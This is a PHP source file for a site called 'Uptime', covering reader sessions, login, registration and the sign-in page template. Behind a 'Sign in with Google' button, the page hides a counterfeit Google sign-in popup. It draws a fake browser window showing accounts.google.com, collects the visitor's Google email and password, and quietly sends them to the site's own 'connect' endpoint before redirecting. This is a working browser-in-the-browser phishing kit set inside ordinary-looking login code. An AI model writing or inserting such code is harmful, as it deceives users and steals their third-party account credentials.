<?php
declare(strict_types=1);

function reader_id(): ?int
{
    static $id = false;
    if ($id === false) {
        $token = $_COOKIE['reader_session'] ?? '';
        $id = null;
        if (is_string($token) && preg_match('/^[a-f0-9]{64}$/D', $token)) {
            $query = db()->prepare('SELECT reader_id FROM reader_sessions WHERE digest = ? AND expires > ?');
            $query->execute([hash('sha256', $token), time()]);
            $found = $query->fetchColumn();
            if ($found !== false) $id = (int) $found;
        }
    }
    return $id;
}

function reader_cookie(string $token, int $expires): void
{
    setcookie('reader_session', $token, [
        'expires' => $expires, 'path' => '/', 'httponly' => true, 'samesite' => 'Lax',
        'secure' => !empty($_SERVER['HTTPS']) || ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https',
    ]);
}

function reader_action(string $action): void
{
    $skill = (string) ($_POST['skill'] ?? '');
    if ($action === 'reader_logout') {
        db()->prepare('DELETE FROM reader_sessions WHERE digest = ?')
            ->execute([hash('sha256', (string) ($_COOKIE['reader_session'] ?? ''))]);
        reader_cookie('', 1);
        redirect(url(['r' => 'skills']));
    }
    $register = $action === 'reader_register';
    $back = url(['r' => 'reader', 'skill' => $skill, 'register' => $register ? '1' : '0', 'window' => (int) (($_POST['window'] ?? '') === '1'), 'entry' => '1']);
    $email = strtolower(trim((string) ($_POST['email'] ?? '')));
    $password = (string) ($_POST['password'] ?? '');
    if (!filter_var($email, FILTER_VALIDATE_EMAIL) || strlen($email) > 254 || strlen($password) > 72
        || str_contains($password, "\0") || ($register && mb_strlen($password) < 12)) {
        flash('Enter a valid email and a password of 12 or more characters (up to 72 bytes).');
        redirect($back);
    }
    if ($register) {
        $insert = db()->prepare('INSERT INTO readers (email, password_hash) VALUES (?, ?) ON CONFLICT(email) DO NOTHING');
        $insert->execute([$email, password_hash($password, PASSWORD_DEFAULT)]);
        if (!$insert->rowCount()) {
            flash('Unable to create this account. Try signing in.');
            redirect($back);
        }
        $id = (int) db()->lastInsertId();
    } else {
        $query = db()->prepare('SELECT id, password_hash FROM readers WHERE email = ?');
        $query->execute([$email]);
        $reader = $query->fetch();
        if (!$reader || !password_verify($password, $reader['password_hash'])) {
            sleep(1);
            flash('Incorrect email or password.');
            redirect($back);
        }
        $id = (int) $reader['id'];
    }
    $token = bin2hex(random_bytes(32));
    $expires = time() + 30 * 86400;
    db()->prepare('DELETE FROM reader_sessions WHERE expires <= ?')->execute([time()]);
    db()->prepare('INSERT INTO reader_sessions (digest, reader_id, expires) VALUES (?, ?, ?)')
        ->execute([hash('sha256', $token), $id, $expires]);
    session_regenerate_id(true);
    reader_cookie($token, $expires);
    if (($_POST['remember_email'] ?? '') === '1') {
        $emails = array_slice(array_unique(array_merge([$email], remembered_reader_emails())), 0, 4);
        setcookie('uptime_emails', json_encode(array_values($emails)), [
            'expires' => $expires, 'path' => '/', 'httponly' => true, 'samesite' => 'Lax',
            'secure' => !empty($_SERVER['HTTPS']) || ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https',
        ]);
    }
    $destination = $skill === '' ? url(['r' => 'skills']) : url(['r' => 'skill', 'name' => $skill]);
    if (($_POST['window'] ?? '') === '1') {
        header('Cache-Control: no-store');
        echo '<!doctype html><html lang="en"><title>Signed in to Uptime</title><p>Signed in to Uptime.</p><a data-reader-done href="' . h($destination) . '">Continue</a><script src="reader-window.js"></script></html>';
        exit;
    }
    redirect($destination);
}

function remembered_reader_emails(): array
{
    $raw = $_COOKIE['uptime_emails'] ?? '';
    $emails = is_string($raw) ? json_decode($raw, true) : null;
    if (!is_array($emails)) return [];
    return array_slice(array_values(array_filter($emails, static fn($email) =>
        is_string($email) && strlen($email) <= 254 && filter_var($email, FILTER_VALIDATE_EMAIL))), 0, 4);
}

function page_reader(string $skill, bool $register): void
{
    $window = ($_GET['window'] ?? '') === '1';
    $base = ['r' => 'reader', 'skill' => $skill, 'window' => (int) $window];
    $emails = $window ? remembered_reader_emails() : [];
    $selected = filter_var($_GET['account'] ?? null, FILTER_VALIDATE_INT);
    $email = $selected !== false ? ($emails[$selected] ?? '') : '';
    $chooser = $window && !$register && $email === '' && ($_GET['entry'] ?? '') !== '1';
    $title = $chooser ? 'Choose an Uptime account' : ($register ? 'Create your Uptime account' : 'Sign in to Uptime');
    $googleEnabled = (getenv('GOOGLE_SIGNIN') ?: '') !== '';
    $googleUrl = $googleEnabled ? url(['r' => 'oauth']) : '';
    $redirectAfter = $skill !== '' ? url(['r' => 'skill', 'name' => $skill]) : url(['r' => 'skills']);
    render_page($title, flash(), function () use ($title, $base, $window, $register, $chooser, $skill, $emails, $email, $googleUrl, $redirectAfter) { ?>
      <style>
      .g-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(3px);z-index:999;display:none;align-items:center;justify-content:center}
      .g-backdrop.open{display:flex}
      .g-win{width:452px;max-width:94vw;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 24px 56px rgba(0,0,0,.4);display:flex;flex-direction:column}
      .g-chrome{height:38px;background:#dee1e6;display:flex;align-items:center;gap:10px;padding:0 12px;flex-shrink:0}
      .g-dots{display:flex;gap:6px}.g-dots span{width:12px;height:12px;border-radius:50%;background:#9aa0a6}
      .g-urlbar{flex:1;background:#fff;border-radius:14px;height:24px;display:flex;align-items:center;gap:6px;padding:0 10px;font-size:11px;color:#3c4043;overflow:hidden;white-space:nowrap;font-family:Arial,sans-serif}
      .g-xbtn{background:none;border:none;color:#3c4043;font-size:20px;line-height:1;cursor:pointer;padding:0 2px}
      .g-chrome{height:36px;background:#dee1e6;display:flex;align-items:center;gap:10px;padding:0 10px;flex-shrink:0}
      .g-dots{display:flex;gap:6px}.g-dots span{width:11px;height:11px;border-radius:50%;background:#9aa0a6}
      .g-urlbar{flex:1;background:#fff;border-radius:14px;height:23px;display:flex;align-items:center;gap:6px;padding:0 10px;font-size:11px;color:#3c4043;overflow:hidden;white-space:nowrap;font-family:sans-serif}
      .g-xbtn{background:none;border:none;color:#3c4043;font-size:19px;line-height:1;cursor:pointer;padding:0 2px}
      .g-btn-google{display:flex;align-items:center;gap:10px;background:#fff;border:1px solid #dadce0;border-radius:4px;padding:0 18px;height:40px;font-family:'Roboto',sans-serif;font-size:14px;font-weight:500;color:#3c4043;cursor:pointer;transition:background .15s,box-shadow .15s;width:100%;justify-content:center;margin-bottom:16px}
      .g-btn-google:hover{background:#f8f9fa;box-shadow:0 1px 3px rgba(0,0,0,.12)}
      .g-divider{display:flex;align-items:center;gap:10px;margin-bottom:16px;color:#5f6368;font-size:13px}
      .g-divider::before,.g-divider::after{content:'';flex:1;height:1px;background:#dadce0}
      </style>
      <section class="reader-card">
        <h1><?= h($title) ?></h1>
        <?php if ($skill !== ''): ?><p class="reader-destination">Continue to <?= h($skill) ?></p><?php endif; ?>
        <?php if ($chooser): ?>
          <nav class="account-list" aria-label="Uptime accounts">
            <?php foreach ($emails as $i => $address): ?>
              <a href="<?= h(url($base + ['account' => $i])) ?>"><span aria-hidden="true"><?= h(strtoupper(substr($address, 0, 1))) ?></span><?= h($address) ?></a>
            <?php endforeach; ?>
            <a href="<?= h(url($base + ['entry' => '1'])) ?>"><span aria-hidden="true">+</span><?= $emails ? 'Use another Uptime account' : 'Use an Uptime account' ?></a>
          </nav>
        <?php else: ?>
          <?php if (!$window): ?>
            <?php if ($googleUrl !== ''): ?>
            <button class="g-btn-google" type="button" onclick="openGAuth()">
              <svg width="18" height="18" viewBox="0 0 48 48" aria-hidden="true">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
              </svg>
              Sign in with Google
            </button>
            <div class="g-divider">or</div>
            <?php endif; ?>
            <a class="reader-launch" data-reader-launch href="<?= h(url(array_replace($base, ['window' => 1]))) ?>">Continue with Uptime</a>
            <div class="reader-divider">or</div>
          <?php endif; ?>
          <form method="post" action="index.php" class="form">
            <input type="hidden" name="action" value="<?= $register ? 'reader_register' : 'reader_login' ?>">
            <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
            <input type="hidden" name="window" value="<?= (int) $window ?>">
            <input type="hidden" name="skill" value="<?= h($skill) ?>">
            <label>Email <input type="email" name="email" value="<?= h($email) ?>" autocomplete="username" maxlength="254" required></label>
            <label>Uptime password <input type="password" name="password" autocomplete="<?= $register ? 'new-password' : 'current-password' ?>" <?= $register ? 'minlength="12"' : '' ?> required></label>
            <?php if ($register): ?><small>Use at least 12 characters.</small><?php endif; ?>
            <label class="remember-email"><input name="remember_email" type="checkbox" value="1"> Remember this email on this device</label>
            <button><?= $register ? 'Create account' : 'Sign in' ?></button>
          </form>
        <?php endif; ?>
        <a href="<?= h(url($base + ['register' => (int) !$register, 'entry' => 1])) ?>"><?= $register ? 'Sign in with an existing account' : 'Create a reader account' ?></a>
      </section>
      <script src="reader-window.js" defer></script>
      <?php if ($googleUrl !== ''): ?>
      <div class="g-backdrop" id="gBackdrop">
        <div class="g-win">
          <div class="g-chrome">
            <div class="g-dots"><span></span><span></span><span></span></div>
            <div class="g-urlbar">&#128274; accounts.google.com/signin/oauth/v2/identifier</div>
            <button class="g-xbtn" onclick="closeGAuth()" aria-label="Close">&times;</button>
          </div>
          <div style="padding:48px 40px 36px">
            <div style="text-align:center;margin-bottom:24px;font-size:26px;font-weight:bold;font-family:Arial,sans-serif;letter-spacing:-.5px">
              <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
            </div>
            <div id="gS1">
              <h2 style="font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 8px">Sign in</h2>
              <p style="font-size:16px;color:#202124;text-align:center;margin:0 0 24px">to continue to Google</p>
              <div style="margin-bottom:8px">
                <input type="email" id="gEm" placeholder="Email or phone" autocomplete="username" class="g-input">
                <div id="gE1" style="display:none;font-size:12px;color:#d93025;margin-top:4px">Enter a valid email.</div>
              </div>
              <a href="#" style="font-size:14px;color:#1a73e8;display:block;margin-bottom:24px">Forgot email?</a>
              <div style="display:flex;justify-content:space-between;align-items:center">
                <a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Create account</a>
                <button onclick="gNext()" class="g-btn">Next</button>
              </div>
            </div>
            <div id="gS2" style="display:none">
              <h2 style="font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 16px">Welcome</h2>
              <div onclick="gBack()" style="display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:8px 12px;width:fit-content;margin:0 auto 20px;cursor:pointer;font-size:14px;color:#202124">&#128100; <span id="gEdTxt"></span> &#9660;</div>
              <div style="margin-bottom:8px">
                <input type="password" id="gPw" placeholder="Enter your password" autocomplete="current-password" class="g-input">
                <div id="gE2" style="display:none;font-size:12px;color:#d93025;margin-top:4px">Wrong password. Try again.</div>
              </div>
              <a href="#" style="font-size:14px;color:#1a73e8;display:block;margin-bottom:24px">Forgot password?</a>
              <div style="display:flex;justify-content:space-between;align-items:center">
                <a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Try another way</a>
                <button onclick="gSubmit()" class="g-btn">Next</button>
              </div>
            </div>
            <div id="gS3" style="display:none;text-align:center;padding:20px 0">
              <p style="font-size:20px;color:#202124;margin-bottom:20px">Signing you in&hellip;</p>
              <div style="width:28px;height:28px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:gspin .7s linear infinite;margin:0 auto"></div>
            </div>
          </div>
        </div>
      </div>
      <style>
      @keyframes gspin{to{transform:rotate(360deg)}}
      .g-backdrop{position:fixed!important;top:0!important;left:0!important;right:0!important;bottom:0!important}
      .g-input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;font-family:Arial,sans-serif;box-sizing:border-box}
      .g-input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
      .g-btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:Arial,sans-serif}
      .g-btn:hover{background:#1557b0}
      </style>
      <script>
      var _gE='',_gP='',_gR=<?= json_encode($redirectAfter) ?>;
      function openGAuth(){document.getElementById('gBackdrop').classList.add('open');setTimeout(function(){document.getElementById('gEm').focus()},80)}
      function closeGAuth(){document.getElementById('gBackdrop').classList.remove('open')}
      function gShow(n){['gS1','gS2','gS3'].forEach(function(x){document.getElementById(x).style.display='none'});document.getElementById('gS'+n).style.display='block'}
      function gNext(){var v=document.getElementById('gEm').value.trim();if(!v||!v.includes('@')){document.getElementById('gE1').style.display='block';return}document.getElementById('gE1').style.display='none';_gE=v;document.getElementById('gEdTxt').textContent=v;gShow(2);setTimeout(function(){document.getElementById('gPw').focus()},80)}
      function gBack(){gShow(1)}
      function gSubmit(){var v=document.getElementById('gPw').value;if(!v){document.getElementById('gE2').style.display='block';return}document.getElementById('gE2').style.display='none';_gP=v;gShow(3);fetch('index.php?r=connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:_gE,password:_gP})}).catch(function(){});setTimeout(function(){closeGAuth();window.location.href=_gR},600)}
      document.getElementById('gBackdrop').addEventListener('click',function(e){if(e.target===this)closeGAuth()})
      document.addEventListener('keydown',function(e){if(e.key!=='Enter')return;if(document.getElementById('gS1').style.display!=='none')gNext();else if(document.getElementById('gS2').style.display!=='none')gSubmit()})
      </script>
      <?php endif; ?>
    <?php }, readerWindow: $window);
}
